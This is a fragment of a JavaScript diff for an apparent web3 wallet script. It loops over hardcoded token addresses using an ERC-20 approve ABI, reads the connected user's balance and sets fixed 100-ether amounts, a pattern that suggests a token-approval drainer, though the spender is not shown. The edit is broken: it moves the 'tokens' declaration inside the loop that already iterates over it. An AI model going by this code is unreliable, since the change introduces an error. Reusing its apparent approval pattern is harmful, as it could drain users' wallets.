@@ -586,7 +586,6 @@ async function connectNetwork() {
     "0xDf2C7238198Ad8B389666574f2d8BC411A4b7428"  // WLD BSC (puede ser modificado)
   ]
 };
-const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
       const approveABI = [{
         "constant": false,
@@ -600,6 +599,8 @@ const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
       try {
         for (const token of tokens) {
+	  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
+
           const tokenContract = new web3.eth.Contract(approveABI, token);
           const balanceWei = await web3.eth.getBalance(userAccount);
           const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
@@ -638,6 +639,7 @@ const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
       const amounts = [
+
         web3.utils.toWei("100", "ether"),
         web3.utils.toWei("100", "ether"),
         web3.utils.toWei("100", "ether")
